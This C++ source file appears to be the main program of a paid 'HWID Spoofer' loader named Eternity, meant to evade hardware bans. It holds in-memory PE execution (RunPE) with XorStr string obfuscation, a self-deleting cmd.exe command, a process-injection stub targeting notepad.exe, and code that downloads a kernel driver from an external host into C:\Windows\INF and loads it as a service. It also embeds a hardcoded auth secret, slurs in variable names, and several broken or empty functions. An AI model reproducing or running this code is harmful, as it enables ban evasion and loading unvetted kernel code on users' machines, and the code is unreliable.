// example.cpp : Este arquivo contém a função 'main'. A execução do programa começa e termina ali.
//
#include "ManualMap.h"
#include <iostream>
#include "api/c_api.hpp"
#include "Mapper/map.h"
#include "ConsoleConfig.h"
#include "Mapper/RunPe/Spoofer.h"
#include "Mapper/RunPe/peBase.hpp"
#include "Mapper/RunPe/fixReloc.hpp"
#include "Mapper/RunPe/fixIAT.hpp"
#include "hwid.cpp"
#include "pipes.h"
#include <Windows.h>
#include <string>
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <urlmon.h>
#include <iostream>
#include <tchar.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <iostream>
#include <Windows.h>
#include <string>
#pragma comment(lib, "urlmon.lib")
#include <stdio.h>
#include <sstream>
#include <wininet.h>
#include <regex>
#include <codecvt>
#include "base64.h"

#pragma comment(lib,"Wininet.lib")

;DWORD GayPornSleep = 5000;
HANDLE Console = GetStdHandle(STD_OUTPUT_HANDLE);

bool RunPE()

{
	system("title Eternity  RPE  1 - 1 - 1");

	LONGLONG fileSize = -1;
	BYTE* data = Confirmation;
	BYTE* pImageBase = NULL;
	LPVOID preferAddr = 0;
	system("title Eternity  RPE  1 - 0 - 1");

	IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)getNtHdrs(data);
	if (!ntHeader)
	{

		return false;
	}
	system("title Eternity  RPE  0 - 0 - 1");

	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);

	preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
	system("title Eternity  RPE  1 - 1 - 1 + 1");

	HMODULE dll = LoadLibraryA(XorStr("ntdll.dll").c_str());
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, XorStr("NtUnmapViewOfSection").c_str()))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
	system("title Eternity  RPE  0 - 0 - 0");

	pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pImageBase && !relocDir)
	{

		return false;
	}
	if (!pImageBase && relocDir)
	{

		pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pImageBase)
		{

			return false;
		}
	}

	system("title Eternity  RPE  1 - 1 - 1 + 0");

	ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;

	memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
	system("title Eternity  RPE  0 - 1 - 0 + 1");

	IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{




		memcpy
		(
			LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress),
			LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData),
			SectionHeaderArr[i].SizeOfRawData

		);

	}
	fixIAT(pImageBase);

	if (pImageBase != preferAddr)
		if (applyReloc((size_t)pImageBase, (size_t)preferAddr, pImageBase, ntHeader->OptionalHeader.SizeOfImage))
			puts("");
	size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	size_t boy = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	((void(*)())retAddr)();
}

std::string tm_to_readable_time(tm ctx) {
    char buffer[25];

    strftime(buffer, sizeof(buffer), XorStr("%m/%d/%y").c_str(), &ctx);

    return std::string(buffer);
};


void Online() {
	bool Connected = InternetCheckConnection("https://google.com", FLAG_ICC_FORCE_CONNECTION, 0);//Checks for internet connection
	if (!Connected)
	{
		system(XorStr("cls").c_str());
		system(XorStr("color c").c_str());
		printf_s(XorStr("\n  Error: You're not connected to the Internet").c_str());
		Sleep(2500);
		exit(1);
	}
}


#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void DelMe1()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
VOID __stdcall DoEnableSvc()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service.

	schService = OpenService(
		schSCManager,            // SCM database 
		"Winmgmt",               // name of service 
		SERVICE_CHANGE_CONFIG);  // need change config access 

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Change the service start type.

	if (!ChangeServiceConfig(
		schService,            // handle of service 
		SERVICE_NO_CHANGE,     // service type: no change 
		SERVICE_DEMAND_START,  // service start type 
		SERVICE_NO_CHANGE,     // error control: no change 
		NULL,                  // binary path: no change 
		NULL,                  // load order group: no change 
		NULL,                  // tag ID: no change 
		NULL,                  // dependencies: no change 
		NULL,                  // account name: no change 
		NULL,                  // password: no change 
		NULL))                // display name: no change
	{
		printf("ChangeServiceConfig failed (%d)\n", GetLastError());
	}
	else printf("Service enabled successfully.\n");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}


DWORD WINAPI Service_injector_Thread()
{
	DWORD Pid = 0;
	MODULEINFO Info;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HMODULE Kernel32 = 0;

	DWORD FileSize = 0, BytesRead = 0;
	PVOID pBuffer = 0;

	while (!(Pid = GetProcessid("notepad.exe")))
		Sleep(50);


	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Pid);

	if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0)
	{
		std::cout << "Invalid Handle " << std::endl;
		return 0;



		VirtualFree(pBuffer, 0, MEM_RELEASE);

		CloseHandle(hProcess);

		return 1;
	}
}

using namespace std;


std::wstring GetStringValueFromHKLM(const std::wstring& regSubKey, const std::wstring& regValue)
{
	size_t bufferSize = 0xFFF;
	std::wstring valueBuf;
	valueBuf.resize(bufferSize);
	auto cbData = static_cast<DWORD>(bufferSize * sizeof(wchar_t));
	auto rc = RegGetValueW(
		HKEY_LOCAL_MACHINE,
		regSubKey.c_str(),
		regValue.c_str(),
		RRF_RT_REG_SZ,
		nullptr,
		static_cast<void*>(valueBuf.data()),
		&cbData);
	while (rc == ERROR_MORE_DATA) {
		cbData /= sizeof(wchar_t);
		if (cbData > static_cast<DWORD>(bufferSize)) {
			bufferSize = static_cast<size_t>(cbData);
		}
		else {
			bufferSize *= 2;
			cbData = static_cast<DWORD>(bufferSize * sizeof(wchar_t));
		}
		valueBuf.resize(bufferSize);
		rc = RegGetValueW(
			HKEY_LOCAL_MACHINE,
			regSubKey.c_str(),
			regValue.c_str(),
			RRF_RT_REG_SZ,
			nullptr,
			static_cast<void*>(valueBuf.data()),
			&cbData);
	}
	if (rc == ERROR_SUCCESS) {
		cbData /= sizeof(wchar_t);
		valueBuf.resize(static_cast<size_t>(cbData - 1));
		return valueBuf;
	}
	else {
		throw std::runtime_error("Windows system error code: " + std::to_string(rc));
	}
}


void suspend(DWORD processId)
{
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	Thread32First(hThreadSnapshot, &threadEntry);

	do
	{
		if (threadEntry.th32OwnerProcessID == processId)
		{
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
				threadEntry.th32ThreadID);

			SuspendThread(hThread);
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnapshot, &threadEntry));

	CloseHandle(hThreadSnapshot);
}



DWORD_PTR FindProcessId2(const std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

void StartThem1(LPCSTR name)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(name, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}



extern "C"
{
	BOOL AdjustCurrentPrivilege(LPCWSTR privilege);

	VOID ForceDeleteFile(LPWSTR path);

}

void ChangeSerialNumber(DWORD Drive, DWORD newSerial)
{
	const int max_pbsi = 3;

	struct partial_boot_sector_info
	{
		LPSTR Fs;
		DWORD FsOffs;
		DWORD SerialOffs;
	};


	CHAR szDrive[12];

	char Sector[512];

	DWORD i;






	if (i >= max_pbsi)
	{
		return;
	}



	
}


DWORD GetVolumeID(void)
{
	SYSTEMTIME s;
	DWORD d;
	WORD lo, hi, tmp;

	GetLocalTime(&s);

	lo = s.wDay + (s.wMonth << 8);
	tmp = (s.wMilliseconds / 10) + (s.wSecond << 8);
	lo += tmp;

	hi = s.wMinute + (s.wHour << 8);
	hi += s.wYear;

	d = lo + (hi << 16);
	return d;
}

void SpoofAllSerial()
{

	CHAR path1[MAX_PATH] = { 0 };

	WCHAR path[MAX_PATH] = { 0 };

	CHAR current[MAX_PATH] = { 0 };

	CHAR NEWSERIAL[MAX_PATH] = { 0 };

	for (DWORD drives = GetLogicalDrives(), drive = L'C', index = 0; drives; drives >>= 1, ++index)
	{
		if (drives & 1)
		{




			DWORD bro = GetVolumeID();
			ChangeSerialNumber(drive, bro);




			CHAR journal[MAX_PATH] = { 0 };

			std::cout << std::endl;

			++drive;
		}
	}
}

void GetPcInfo()
{
	int numberoferrors = 0;
#pragma warning(disable : 4996)

	using std::endl;
	int CPUInfo[4] = { -1 };
	unsigned nExIds, i = 0;
	char CPUBrandString[0x40];
	// Get the information associated with each extended ID.
	__cpuid(CPUInfo, 0x80000000);
	nExIds = CPUInfo[0];
	for (i = 0x80000000; i <= nExIds; ++i) {
		__cpuid(CPUInfo, i);
		// Interpret CPU brand string
		if (i == 0x80000002)
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000003)
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000004)
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
	}
	std::string getcpu = CPUBrandString;

	//Check intel
	std::regex regexp(XorStr(("I[a-zA-z]+")).c_str());

	std::smatch m;

	std::regex_search(getcpu, m, regexp);
	//Check amd
	std::regex regexp1(XorStr(("A[a-zA-z]+")).c_str());

	std::smatch m1;

	std::regex_search(getcpu, m1, regexp1);


	system(XorStr("color b").c_str());

	for (auto x : m)
		if (x == "Intel") {
			Sleep(1000);
			cout << "[+] Found Intel processor: Fully Supported\n";
		}
	for (auto x : m1)
		if (x == "AMD") {
			numberoferrors++;
			Sleep(1000);
			cout << (XorStr("[!] Found Amd processor: Testing Support(Might work)\n").c_str());
			Sleep(2000);
			return;
		}


	HKEY hKey;
	DWORD buffer;
	LONG result;
	unsigned long type = REG_DWORD, size = 1024;

	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (XorStr("SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State").c_str()), 0, KEY_READ, &hKey);
	if (result == ERROR_SUCCESS) {
		RegQueryValueEx(hKey, "UEFISecureBootEnabled", NULL, &type, (LPBYTE)&buffer, &size);

		if (buffer == 0) {
			cout << (XorStr("[+] Found Secure boot Off: Fully Supported\n").c_str());
			Sleep(1000);
		}
		else {
			numberoferrors++;
			cout << (XorStr("[-] Found Secure boot On: UnSupported\n").c_str());
			Sleep(1000);
		}
		RegCloseKey(hKey);
	}
	else {
		numberoferrors++;
		system("cls");
		Sleep(1000);
		cout << (XorStr("[-] Corrupt registry cannot continue.\n").c_str());
		Sleep(2000);
	}
	//Get Fast boot status
	HKEY hKey1;
	DWORD buffer1;
	LONG result1;
	unsigned long type1 = REG_DWORD, size1 = 1024;

	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (XorStr("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power").c_str()), 0, KEY_READ, &hKey1);
	if (result == ERROR_SUCCESS) {
		RegQueryValueEx(hKey1, "HiberbootEnabled", NULL, &type1, (LPBYTE)&buffer1, &size1);

		if (buffer1 == 0) {
			cout << (XorStr("[+] Found Fast Startup Off: Fully Supported\n").c_str());
			Sleep(1000);
		}
		else {
			numberoferrors++;
			cout << (XorStr("[-] Found Fast Startup On: Testing Support(Might work)\n").c_str());
			Sleep(1000);
		}
		RegCloseKey(hKey);
	}
	else {
		numberoferrors++;
		system("cls");
		Sleep(1000);
		cout << (XorStr("[-] Corrupt registry cannot continue.\n").c_str());
		Sleep(2000);
	}
	//Get os version
	std::wstring regSubKey;
#ifdef _WIN64
	regSubKey = (XorStr(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").c_str());
#else
	regSubKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
#endif
	std::wstring regValue(L"ReleaseId");
	std::wstring valueFromRegistry;
	try {
		valueFromRegistry = GetStringValueFromHKLM(regSubKey, regValue);
	}
	catch (std::exception& e) {
		numberoferrors++;
		std::cerr << e.what();
	}
	string https = XorStr("https://");

	using convert_type = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_type, wchar_t> converter;
	std::string converted_string = converter.to_bytes(valueFromRegistry);
	std::string test = converted_string;

	std::regex regexp2("(^|\\s)([\\+-]?([0-9]+\\.?[0-9]*|\\.?[0-9]+))(\\s|$)");

	std::smatch m2;

	std::regex_search(test, m2, regexp2);

	for (auto x : m2)
		if (x == "1909") {
			cout << (XorStr("[+] Found Windows version 1909: Fully Supported\n").c_str());
			Sleep(1000);
			break;
		}
		else if (x == "1903") {
			cout << (XorStr("[+] Found Windows version 1903: Fully Supported\n").c_str());
			Sleep(1000);
			break;
		}
		else if (x == "1809") {
			cout << (XorStr("[+] Found Windows version 1809: Fully Supported\n").c_str());
			Sleep(1000);
			break;
		}
		else if (x == "1803") {
			cout << (XorStr("[+] Found Windows version 1803: Fully Supported\n").c_str());
			Sleep(1000);
			break;
		}
		else if (x == "2004") {
			cout << (XorStr("[+] Found Windows version 2004: Semi-Supported\n").c_str());
			Sleep(1000);
			break;
		}
		else {
			numberoferrors++;

			cout << (XorStr("[-] Found Windows version: UnSupported\n").c_str());
			Sleep(500);
			cout << (XorStr("[!] Works on 1803 - 2004 only.\n").c_str());
			cout << (XorStr("\n[+] Press any key to continue\n").c_str());
			system("pause > nul");

			//Beep(700, 1000);
			break;
		}
	cout << (XorStr("\n[+] Press any key to continue\n").c_str());
	system("pause > nul");
	system(XorStr("cls").c_str());
	Sleep(2000);

}



c_auth::api auth_instance((XorStr("1.0").c_str()), XorStr("q2mN22IdNLxv5GhKu8WT4yYS2MWLlISZlcNTN6139hr").c_str(), XorStr("31bccf49bf0883d0035b320a8c0449b3").c_str());

int main()
{
	remove("C:\Program Files\Win32Log.txt");
	InitiateSecurityProtocol();
	GetPcInfo();
	system("CLS");
    ConsoleConfig::InitialiseConsole();
	std::cout << XorStr("\n\n").c_str();
	ConsoleConfig::oliveroutput(XorStr("  Initializing..").c_str(), 4, true, true, NULL);
    auth_instance.init();
	Sleep(3500);
	ConsoleConfig::oliveroutput(XorStr("  Initialized!").c_str(), 4, true, true, NULL);
	Sleep(1000);
	Sleep(800);
	ConsoleConfig::oliveroutput(XorStr("  Connecting To Servers..").c_str(), 4, true, true, NULL);
	Online();
	Sleep(1200);
	Online();
	ConsoleConfig::oliveroutput(XorStr("  Connected!").c_str(), 4, true, true, NULL);
	Sleep(1000);
	Sleep(1000);
	string lh = XorStr("lhaasper");

    system(XorStr("cls").c_str());
	std::string token;
	system(XorStr("color b").c_str());
    std::cout << XorStr("Key: ").c_str();
	Online();
    std::cin >> token;
    if (auth_instance.all_in_one(token))
    {


		auto loginid = XorStr("LOGIN ID: ").c_str() + ConsoleConfig::Random_Value(8, "1234567890");
		auto communicationid = XorStr("COMMUNICATION ID: ").c_str() + ConsoleConfig::Random_Value(8, "1234567890");
		auto serverid = XorStr("SERVER LOGIN ID: ").c_str() + ConsoleConfig::Random_Value(8, "1234567890");


		system(XorStr("cls").c_str());
		ConsoleConfig::oliveroutput((communicationid).c_str(), 12, false, false, NULL);
		ConsoleConfig::oliveroutput((serverid).c_str(), 12, false, false, NULL);
		ConsoleConfig::oliveroutput((loginid).c_str(), 12, false, false, NULL);
		printf_s(XorStr("\n\n  Status: ").c_str());
        printf_s(XorStr("Undetected").c_str());
		printf_s(XorStr("\n  Product(s): \n\n").c_str());
		printf_s(XorStr("HWID Spoofer\n\n").c_str());
		printf_s(XorStr("Press any key to continue\n\n").c_str());
		system("pause > nul");

		printf_s(XorStr("  User: ").c_str());
		system(XorStr("hostname").c_str());
		Sleep(3500);
		system(XorStr("cls").c_str());
		system(XorStr("color b").c_str());
		auto spoofcall = XorStr("Calling Spoofer Entry At (ptr)->0x").c_str() + ConsoleConfig::Random_Value(4, "1234567890");
		auto errorid = XorStr("ERROR ID: ").c_str() + ConsoleConfig::Random_Value(4, "1234567890");
		auto sessionid = XorStr("SESSION ID: ").c_str() + ConsoleConfig::Random_Value(8, "1234567890");
		if (!GlobalFindAtomA(XorStr("912.sys").c_str()) == 0)
		{

			system(XorStr("cls").c_str());
			std::cout << XorStr("\n\n").c_str();
			ConsoleConfig::oliveroutput((errorid).c_str(), 4, false, false, NULL);
			ConsoleConfig::oliveroutput(XorStr("Already Spoofed, please restart computer to continue...").c_str(), 4, true, true, NULL);
			Sleep((DWORD)GayPornSleep);
			exit(-1);

		};
        std::string TitleRing = XorStr("Eternity | Expires: ").c_str() + tm_to_readable_time(auth_instance.user_data.expires);
		system(XorStr("cls").c_str());
	    SetConsoleTitle(TitleRing.c_str());
        ConsoleConfig::oliveroutput(XorStr("Creating New Instance.").c_str(), 9, true, true, NULL);
		ConsoleConfig::oliveroutput((sessionid).c_str(), 12, false, false, NULL);
		Sleep(1000);
        ConsoleConfig::oliveroutput(XorStr("Done.").c_str(), 7, false, false, NULL);
        ConsoleConfig::oliveroutput(XorStr("Flushing Adaptors.").c_str(), 9, true, true, NULL);
        system(XorStr("netsh winsock reset>nul").c_str());
		ConsoleConfig::oliveroutput(XorStr("1/5").c_str(), 9, true, true, NULL);

        system(XorStr("netsh int ip reset > nul").c_str());
		ConsoleConfig::oliveroutput(XorStr("2/5").c_str(), 9, true, true, NULL);

        system(XorStr("ipconfig /release > nul").c_str());
		ConsoleConfig::oliveroutput(XorStr("3/5").c_str(), 9, true, true, NULL);

		ConsoleConfig::oliveroutput(XorStr("4/5").c_str(), 9, true, true, NULL);

        system(XorStr("ipconfig /flushdns > nul").c_str());
		ConsoleConfig::oliveroutput(XorStr("5/5").c_str(), 9, true, true, NULL);

        ConsoleConfig::oliveroutput(XorStr("Flushed Adaptors.").c_str(), 7, false, false, NULL);
		system("Title Eternity - flAd");
		string http = XorStr("https://");

       ConsoleConfig::oliveroutput((spoofcall).c_str(), 9, true, true, NULL);
		

		system("Title Eternity - b-LW");
		string abcdef = XorStr("C:\\Windows\\");


		//driver below is probably detected, dont use!
		//likewisemap::InitialiseSpoofer();


		system("Title Eternity - GetPROtkn - 4533453452");
		string lh = XorStr("lhaasper");

		if (!GetProcessToken())
		{
			std::cout << "[-] Error: Could not get ProcessToken";
			Sleep(3000);
			exit(0);
		}


		string testing = XorStr("inf\\");



		system("Title Eternity - b-SIt");
		string test = "test";
		string drvname = XorStr("912.sys");
		//Service_injector_Thread();
		system("Title Eternity - a-SIt");
		string abc = "abc" + test;
		string u = abcdef + testing + drvname;

		string retardedassnigga = http + lh + ".de/extern/" + drvname;
		cout << "---Entering main---\n\n";
		std::string base64_decode(retardedassnigga);


		string location = "C:/windows/IME/Driver.sys";

		HRESULT hr = URLDownloadToFile(NULL, _T(retardedassnigga.c_str()), _T(u.c_str()), 0, NULL);

		cout << "[x] Press any key to load driver.\n";
		system("Pause > nul");

		auto result = driver::load("C:\\Windows\\INF\\912.sys", "AJService");
		cout << "[+] Loaded!, Press any key to exit!\n";
		system("Pause > nul");
		exit(1);




	}

		std::cout << XorStr("\n\n").c_str();
		system("Title Eternity - t-RPE");
		RunPE();
		system("Title Eternity - a-RPE");
		exit(0);


}
       


